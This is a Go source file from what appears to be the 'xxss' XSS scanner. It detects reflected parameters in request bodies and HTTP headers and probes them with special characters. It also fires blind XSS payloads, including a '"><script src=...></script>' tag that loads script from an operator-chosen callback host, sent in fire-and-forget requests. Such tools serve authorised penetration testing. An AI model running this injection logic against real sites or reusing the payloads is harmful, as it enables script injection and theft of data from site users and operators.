package scanner

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/lcalzada-xor/xxss/v2/pkg/models"
	"github.com/lcalzada-xor/xxss/v2/pkg/scanner/payloads"
	"github.com/lcalzada-xor/xxss/v2/pkg/scanner/reflection"
)

// VulnerableHeaders is the list of common HTTP headers that can be vulnerable to XSS
var VulnerableHeaders = []string{
	"User-Agent",
	"Referer",
	"X-Forwarded-For",
	"X-Real-IP",
	"X-Forwarded-Host",
	"X-Original-URL",
	"Accept-Language",
}

// ScanRequest performs XSS scan on POST/PUT/PATCH requests with body parameters
func (s *Scanner) ScanRequest(ctx context.Context, config *models.RequestConfig) ([]models.Result, error) {
	results := []models.Result{}

	// 1. Parse body parameters
	params := parseBodyParams(config.Body, string(config.ContentType))
	if len(params) == 0 {
		return results, nil
	}

	// 2. Baseline check: see which parameters are reflected
	reflectedParams, err := s.checkBodyReflection(config, params)
	if err != nil {
		return results, err
	}

	// 3. Scan Body Parameters
	if config.Method == "POST" || config.Method == "PUT" || config.Method == "PATCH" {
		for _, param := range reflectedParams {
			result, err := s.probeRequestParameter(ctx, config, param)
			if err != nil {
				continue
			}

			// Contextual Blind XSS Injection (after context detection)
			if s.blindURL != "" && result.Context != models.ContextUnknown {
				s.injectContextualBlindBody(config, param, result.Context)
			}

			if len(result.Unfiltered) > 0 {
				results = append(results, result)
			}
		}
	}

	return results, nil
}

func parseBodyParams(body, contentType string) map[string]string {
	params := make(map[string]string)
	if contentType == "application/json" {
		// Simple JSON parser (flat key-value for now)
		var data map[string]interface{}
		if err := json.Unmarshal([]byte(body), &data); err == nil {
			for k, v := range data {
				if strVal, ok := v.(string); ok {
					params[k] = strVal
				}
			}
		} else {
			fmt.Printf("JSON Unmarshal error: %v\n", err)
		}
	} else {
		// Assume form-urlencoded
		values, err := url.ParseQuery(body)
		if err == nil {
			for k, v := range values {
				if len(v) > 0 {
					params[k] = v[0]
				}
			}
		}
	}
	return params
}

func (s *Scanner) checkBodyReflection(config *models.RequestConfig, params map[string]string) ([]string, error) {
	reflected := []string{}

	for key := range params {
		// Create a copy of params for this test
		testParams := make(map[string]string)
		for k, v := range params {
			testParams[k] = v
		}

		probe := fmt.Sprintf("xxss_%d", time.Now().UnixNano())
		testParams[key] = probe

		// Build request body
		var body string
		if config.ContentType == "application/json" {
			// Reconstruct JSON properly
			jsonBytes, _ := json.Marshal(testParams)
			body = string(jsonBytes)
		} else {
			// Reconstruct form-urlencoded
			v := url.Values{}
			for k, val := range testParams {
				v.Set(k, val)
			}
			body = v.Encode()
		}

		req, err := http.NewRequest(string(config.Method), config.URL, strings.NewReader(body))
		if err != nil {
			continue
		}
		req.Header.Set("Content-Type", string(config.ContentType))
		req.Header.Add("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.100 Safari/537.36")
		for k, v := range s.headers {
			req.Header.Set(k, v)
		}

		start := time.Now()
		resp, err := s.client.Do(req)
		s.requestMutex.Lock()
		s.requestCount++
		s.requestMutex.Unlock()
		if err != nil {
			continue
		}

		bodyBytes, err := io.ReadAll(resp.Body)
		resp.Body.Close()
		elapsed := time.Since(start)
		if err != nil {
			continue
		}
		respBody := string(bodyBytes)

		if strings.Contains(respBody, probe) {
			reflected = append(reflected, key)
			s.logger.Detail("Reflected: YES (%s) (%d bytes, %v)", key, len(bodyBytes), elapsed)
		} else {
			s.logger.Detail("Reflected: NO (%s) (%d bytes, %v)", key, len(bodyBytes), elapsed)
		}
	}

	return reflected, nil
}

func (s *Scanner) probeRequestParameter(ctx context.Context, config *models.RequestConfig, param string) (models.Result, error) {
	s.logger.Section(fmt.Sprintf("Probing Parameter: %s", param))

	params := parseBodyParams(config.Body, string(config.ContentType))
	val := params[param]

	probeStr := "xssprobe"
	payload := val + probeStr + strings.Join(reflection.SpecialChars, "") + probeStr

	testBody := createBodyWithProbe(params, param, payload, config.ContentType)

	req, err := http.NewRequestWithContext(ctx, string(config.Method), config.URL, bytes.NewBufferString(testBody))
	if err != nil {
		return models.Result{}, err
	}

	req.Header.Set("Content-Type", string(config.ContentType))
	req.Header.Add("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.100 Safari/537.36")
	for k, v := range s.headers {
		req.Header.Set(k, v)
	}

	resp, err := s.client.Do(req)
	s.requestMutex.Lock()
	s.requestCount++
	s.requestMutex.Unlock()
	if err != nil {
		return models.Result{}, err
	}

	return s.AnalyzeReflection(config.URL, string(config.Method), param, models.InjectionBody, resp, probeStr)
}

// ScanHeader scans a specific HTTP header for XSS
func (s *Scanner) ScanHeader(ctx context.Context, targetURL, headerName string) (models.Result, error) {
	probeStr := "xssprobe"
	payload := probeStr + strings.Join(reflection.SpecialChars, "") + probeStr

	req, err := http.NewRequestWithContext(ctx, "GET", targetURL, nil)
	if err != nil {
		return models.Result{}, err
	}

	req.Header.Set(headerName, payload)
	req.Header.Add("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.100 Safari/537.36")
	for k, v := range s.headers {
		if k != headerName {
			req.Header.Set(k, v)
		}
	}

	resp, err := s.client.Do(req)
	s.requestMutex.Lock()
	s.requestCount++
	s.requestMutex.Unlock()
	if err != nil {
		return models.Result{}, err
	}

	// Blind XSS injection for headers
	if s.blindURL != "" {
		// We don't know context yet, but headers are usually raw or HTML
		// We can inject a generic blind payload
		s.injectBlindHeader(targetURL, headerName)
	}

	return s.AnalyzeReflection(targetURL, "GET", headerName, models.InjectionHeader, resp, probeStr)
}

// injectContextualBlindBody injects context-specific blind XSS payloads into POST body
func (s *Scanner) injectContextualBlindBody(config *models.RequestConfig, param string, context models.ReflectionContext) {
	uniqueURL := payloads.GenerateUniqueCallback(s.blindURL, param)
	contextPayloads := payloads.BlindPayloadsForContext(uniqueURL, context)

	s.logger.V("[BLIND] Body:%s [%s] → %s (%d contextual payloads)", param, context, uniqueURL, len(contextPayloads))

	params := parseBodyParams(config.Body, string(config.ContentType))

	for _, payload := range contextPayloads {
		testBody := createBodyWithProbe(params, param, payload, config.ContentType)

		req, err := http.NewRequest(string(config.Method), config.URL, bytes.NewBufferString(testBody))
		if err != nil {
			continue
		}

		req.Header.Set("Content-Type", string(config.ContentType))
		req.Header.Add("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.100 Safari/537.36")
		for k, v := range s.headers {
			req.Header.Set(k, v)
		}

		// Fire and forget
		go func(r *http.Request) {
			s.client.Do(r)
		}(req)
	}
}

func (s *Scanner) injectBlindHeader(targetURL, headerName string) {
	uniqueURL := payloads.GenerateUniqueCallback(s.blindURL, headerName)
	payload := fmt.Sprintf("\"><script src=\"%s\"></script>", uniqueURL)

	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil {
		return
	}

	req.Header.Set(headerName, payload)
	go func(r *http.Request) {
		s.client.Do(r)
	}(req)
}

func createBodyWithProbe(params map[string]string, targetParam, probe string, contentType models.ContentType) string {
	if contentType == "application/json" {
		// Create copy and marshal
		newParams := make(map[string]string)
		for k, v := range params {
			newParams[k] = v
		}
		newParams[targetParam] = probe

		jsonBytes, _ := json.Marshal(newParams)
		return string(jsonBytes)
	}

	// Reconstruct form-urlencoded
	v := url.Values{}
	for k, val := range params {
		if k == targetParam {
			v.Set(k, probe)
		} else {
			v.Set(k, val)
		}
	}
	return v.Encode()
}
